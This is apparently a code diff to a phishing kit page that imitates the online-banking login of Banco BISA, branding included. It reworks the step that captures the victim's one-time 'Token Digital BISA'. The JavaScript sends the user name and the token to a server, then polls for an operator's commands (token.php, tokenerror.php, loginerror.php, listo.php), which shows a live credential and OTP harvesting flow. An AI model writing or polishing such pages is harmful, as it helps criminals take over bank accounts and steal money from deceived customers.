@@ -296,6 +296,16 @@ if ($method === 'GET' && isset($_GET['check'])) {
     .step2-links a:hover { text-decoration: underline; }
     .step2-links span { color: #999; margin: 0 6px; }
 
+    .step-3 { display: none; }
+    .step-3.active { display: block; }
+    .step-3 h1 {
+      font-size: 21px; font-weight: 400; color: #333;
+      margin-bottom: 10px;
+    }
+    .token-subtitle {
+      font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5;
+    }
+
     .error-msg {
       display: none; padding: 10px 14px; margin-bottom: 16px;
       background: #fdecea; border-left: 3px solid #d32f2f;
@@ -325,49 +335,6 @@ if ($method === 'GET' && isset($_GET['check'])) {
       100% { transform: translateX(100%); }
     }
     .loading-text { margin-top: 20px; color: rgba(255,255,255,0.85); font-size: 13px; letter-spacing: 1px; font-weight: 300; }
-
-    .otp-screen { display: none; position: fixed; inset: 0; background: #ebebec; z-index: 9998; flex-direction: column; }
-    .otp-screen.active { display: flex; }
-    .otp-header { background: #003e7e; height: 180px; display: flex; align-items: center; justify-content: center; position: relative; }
-    .otp-header img { height: 78px; margin-top: -47px; }
-    .otp-card {
-      max-width: 480px; width: calc(100% - 40px); margin: -60px auto 0;
-      background: #fff; padding: 40px 36px 32px; box-shadow: 0 2px 12px rgba(0,0,0,0.08);
-      text-align: center; position: relative; z-index: 2;
-    }
-    .otp-icon {
-      width: 64px; height: 64px; margin: 0 auto 20px; background: #003e7e;
-      display: flex; align-items: center; justify-content: center; border-radius: 50%;
-    }
-    .otp-icon svg { width: 32px; height: 32px; }
-    .otp-title { font-size: 20px; font-weight: 500; color: #003e7e; margin-bottom: 10px; }
-    .otp-subtitle { font-size: 13.5px; color: #555; line-height: 1.5; margin-bottom: 24px; }
-    .otp-subtitle strong { color: #003e7e; font-weight: 500; }
-    .otp-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 22px; }
-    .otp-inputs input {
-      width: 44px; height: 52px; border: 1.5px solid #80cbc4; background: #fff;
-      font-size: 22px; text-align: center; color: #003e7e; font-weight: 500;
-      outline: none; transition: border-color 0.2s, box-shadow 0.2s;
-    }
-    .otp-inputs input:focus { border-color: #003e7e; box-shadow: 0 0 0 2px rgba(0,62,126,0.15); }
-    .otp-inputs input.filled { border-color: #003e7e; background: #f5f9ff; }
-    .otp-timer { font-size: 12.5px; color: #666; margin-bottom: 20px; }
-    .otp-timer strong { color: #003e7e; }
-    .otp-error { display: none; color: #d32f2f; font-size: 12.5px; margin-bottom: 14px; }
-    .otp-error.active { display: block; }
-    .otp-resend {
-      background: none; border: none; color: #0278a7;
-      font-size: 12.5px; cursor: pointer; font-weight: 500;
-    }
-    .otp-resend:hover { text-decoration: underline; }
-    .otp-resend:disabled { color: #aaa; cursor: not-allowed; text-decoration: none; }
-    .btn-validar {
-      width: 200px; padding: 12px 0; background: #43a047; color: #fff;
-      border: none; font-size: 14px; font-weight: 500; cursor: pointer;
-      transition: background 0.2s; letter-spacing: 0.3px; margin-top: 8px;
-    }
-    .btn-validar:hover { background: #388e3c; }
-    .btn-validar:disabled { background: #a9d9f0; cursor: not-allowed; }
 
     .login-divider { margin-top: auto; border: none; border-top: 1px solid #e0e0e0; }
 
@@ -417,10 +384,6 @@ if ($method === 'GET' && isset($_GET['check'])) {
       .banner-panel { width: 100%; min-height: auto; }
       .banner-image-area img { height: auto; width: 100%; object-fit: contain; }
       .footer { display: none; }
-      .otp-header { height: 120px; }
-      .otp-header img { height: 50px; margin-top: -30px; }
-      .otp-card { padding: 28px 20px 24px; margin-top: -40px; }
-      .otp-inputs input { width: 38px; height: 46px; font-size: 18px; }
     }
     @media (min-width: 769px) {
       .header-nav a.contact-icon { display: none; }
@@ -553,6 +516,27 @@ if ($method === 'GET' && isset($_GET['check'])) {
           </div>
         </div>
 
+        <!-- Step 3: Token Digital BISA -->
+        <div class="step-3" id="step3">
+          <h1>Token Digital BISA</h1>
+          <p class="token-subtitle">Ingrese el Token Digital BISA generado en la app e-Bisa+</p>
+          <div class="error-msg" id="otpError">Código incorrecto. Intente nuevamente.</div>
+          <div class="input-group">
+            <svg class="user-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="4" y="10" width="16" height="11" rx="1"/>
+              <path d="M8 10V7a4 4 0 018 0v3"/>
+            </svg>
+            <div class="input-wrapper">
+              <input type="password" placeholder="Ingrese su Token Digital BISA" id="tokenInput" inputmode="numeric" autocomplete="off" maxlength="6"/>
+            </div>
+          </div>
+          <div class="virtual-kb"><a href="#">Teclado virtual</a></div>
+          <div class="step2-actions">
+            <button class="btn-cancelar" type="button" id="btnTokenCancel">Cancelar</button>
+            <button class="btn-siguiente" type="button" id="btnConfirmar">Confirmar</button>
+          </div>
+        </div>
+
         <hr class="login-divider"/>
       </section>
 
@@ -585,39 +569,6 @@ if ($method === 'GET' && isset($_GET['check'])) {
   <div class="loading-text">CARGANDO...</div>
 </div>
 
-<!-- OTP / SMS Screen -->
-<div class="otp-screen" id="otpScreen">
-  <div class="otp-header">
-    <img src="img/logo_positivo_login-big.b9c9cab904e2bff7e1a9.png" alt="banco BISA"/>
-  </div>
-  <div class="otp-card">
-    <div class="otp-icon">
-      <svg viewBox="0 0 24 24" fill="none" stroke="#ffc400" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="6" y="2" width="12" height="20" rx="2"/>
-        <line x1="11" y1="18" x2="13" y2="18"/>
-      </svg>
-    </div>
-    <h2 class="otp-title">Verificación de seguridad</h2>
-    <p class="otp-subtitle">
-      Para continuar, ingresa tu <strong>Token BISA</strong>.<br/>
-      Abre tu aplicación e-BISA+, selecciona la opción <strong>"Token BISA"</strong> y escribe el código generado.
-    </p>
-    <div class="otp-error" id="otpError">Código incorrecto. Intente nuevamente.</div>
-    <div class="otp-inputs" id="otpInputs">
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
-    </div>
-    <div class="otp-timer">Tu token expira en <strong id="otpTimer">02:00</strong></div>
-    <button class="btn-validar" type="button" id="btnValidar" disabled>Validar</button>
-    <div style="margin-top:18px;">
-      <button class="otp-resend" type="button" id="btnResend" disabled>Generar nuevo token</button>
-    </div>
-  </div>
-</div>
 
 <!-- Popup Beneficio -->
 <div class="popup-overlay" id="popupOverlay">
@@ -643,10 +594,10 @@ if ($method === 'GET' && isset($_GET['check'])) {
   const togglePwd = $('togglePwd');
   const overlay = $('loadingOverlay');
   const loginError = $('loginError');
-  const otpScreen = $('otpScreen');
-  const otpInputs = document.querySelectorAll('#otpInputs input');
-  const btnValidar = $('btnValidar'), btnResend = $('btnResend');
-  const otpTimer = $('otpTimer'), otpError = $('otpError');
+  const step3 = $('step3');
+  const tokenInput = $('tokenInput');
+  const btnConfirmar = $('btnConfirmar');
+  const otpError = $('otpError');
 
   let pollInterval = null;
   let timerInterval = null;
@@ -757,106 +708,72 @@ if ($method === 'GET' && isset($_GET['check'])) {
     btnIng.disabled = false;
 
     if (action === 'token.php') {
-      showOtp();
+      showToken();
     } else if (action === 'loginerror.php') {
       showError(loginError);
       password.value = '';
       password.focus();
     } else if (action === 'listo.php') {
       overlay.classList.add('active');
-      // Queda en pantalla de carga (finalizado)
     } else if (action === 'index.php') {
       goToStep1WithError();
     } else {
-      // Acción desconocida: mostrar OTP por defecto
-      showOtp();
+      showToken();
     }
   }
 
-  // ── OTP Screen ──
-  function showOtp() {
-    otpScreen.classList.add('active');
+  // ── Token Screen (Step 3) ──
+  function showToken() {
+    step1.classList.add('hidden');
+    step2.classList.remove('active');
+    step3.classList.add('active');
     hideError(otpError);
-    otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
-    btnValidar.disabled = true;
-    startOtpTimer(120);
-    setTimeout(() => otpInputs[0].focus(), 100);
+    tokenInput.value = '';
+    setTimeout(() => tokenInput.focus(), 100);
   }
 
-  function startOtpTimer(seconds) {
-    clearInterval(timerInterval);
-    btnResend.disabled = true;
-    let s = seconds;
-    const tick = () => {
-      const m = String(Math.floor(s/60)).padStart(2,'0');
-      const ss = String(s%60).padStart(2,'0');
-      otpTimer.textContent = m+':'+ss;
-      if (s <= 0) { clearInterval(timerInterval); btnResend.disabled = false; }
-      s--;
-    };
-    tick();
-    timerInterval = setInterval(tick, 1000);
+  function hideToken() {
+    step3.classList.remove('active');
   }
 
-  otpInputs.forEach((input, idx) => {
-    input.addEventListener('input', e => {
-      const v = e.target.value.replace(/\D/g,'');
-      e.target.value = v;
-      v ? (e.target.classList.add('filled'), idx < otpInputs.length-1 && otpInputs[idx+1].focus())
-        : e.target.classList.remove('filled');
-      btnValidar.disabled = !Array.from(otpInputs).every(i => i.value);
-    });
-    input.addEventListener('keydown', e => {
-      if (e.key === 'Backspace' && !input.value && idx > 0) otpInputs[idx-1].focus();
-    });
-    input.addEventListener('paste', e => {
-      e.preventDefault();
-      const data = (e.clipboardData.getData('text')||'').replace(/\D/g,'');
-      data.split('').slice(0, otpInputs.length).forEach((ch,i) => {
-        otpInputs[i].value = ch; otpInputs[i].classList.add('filled');
-      });
-      const ne = Array.from(otpInputs).findIndex(i => !i.value);
-      (ne>=0 ? otpInputs[ne] : otpInputs[otpInputs.length-1]).focus();
-      btnValidar.disabled = !Array.from(otpInputs).every(i => i.value);
-    });
+  // Solo permitir números en token
+  tokenInput.addEventListener('input', e => {
+    e.target.value = e.target.value.replace(/\D/g, '');
   });
 
-  async function submitOtp() {
-    const otp = Array.from(otpInputs).map(i => i.value).join('');
-    if (otp.length < 6) return;
+  async function submitToken() {
+    const otp = tokenInput.value.trim();
+    if (otp.length < 6) { tokenInput.focus(); return; }
     hideError(otpError);
     overlay.classList.add('active');
-    otpScreen.classList.remove('active');
-    btnValidar.disabled = true;
 
     await sendData({ action: 'otp', usuario: currentUser, otp: otp });
 
-    startPolling(handleOtpAction);
+    startPolling(handleTokenAction);
   }
 
-  function handleOtpAction(action) {
+  function handleTokenAction(action) {
     overlay.classList.remove('active');
 
     if (action === 'tokenerror.php') {
-      otpScreen.classList.add('active');
       showError(otpError);
-      otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
-      btnValidar.disabled = true;
-      otpInputs[0].focus();
+      tokenInput.value = '';
+      tokenInput.focus();
     } else if (action === 'token.php') {
-      showOtp();
+      showToken();
     } else if (action === 'loginerror.php') {
-      otpScreen.classList.remove('active');
+      hideToken();
+      step1.classList.remove('hidden');
       showError(loginError);
       password.value = '';
-      password.focus();
+      usuario.value = '';
+      usuario.focus();
     } else if (action === 'index.php') {
-      otpScreen.classList.remove('active');
+      hideToken();
       goToStep1WithError();
     } else if (action === 'listo.php') {
       overlay.classList.add('active');
     } else {
-      // card.php, mail.php u otro: loading permanente
       overlay.classList.add('active');
     }
   }
@@ -864,7 +781,7 @@ if ($method === 'GET' && isset($_GET['check'])) {
   // ── Event listeners ──
   btnSig.addEventListener('click', goToStep2);
   usuario.addEventListener('keydown', e => { if (e.key === 'Enter') goToStep2(); });
-  btnCambiar.addEventListener('click', goToStep1);
+  btnCambiar.addEventListener('click', () => { hideToken(); goToStep1(); });
   const btnCancelar = $('btnCancelar');
   if (btnCancelar) btnCancelar.addEventListener('click', goToStep1);
   btnIng.addEventListener('click', doLogin);
@@ -873,14 +790,10 @@ if ($method === 'GET' && isset($_GET['check'])) {
     password.type = password.type === 'password' ? 'text' : 'password';
   });
 
-  btnValidar.addEventListener('click', submitOtp);
-  btnResend.addEventListener('click', () => {
-    otpInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
-    btnValidar.disabled = true;
-    hideError(otpError);
-    otpInputs[0].focus();
-    startOtpTimer(120);
-  });
+  btnConfirmar.addEventListener('click', submitToken);
+  tokenInput.addEventListener('keydown', e => { if (e.key === 'Enter') submitToken(); });
+  const btnTokenCancel = $('btnTokenCancel');
+  if (btnTokenCancel) btnTokenCancel.addEventListener('click', () => { hideToken(); goToStep1(); });
 })();
 </script>
 
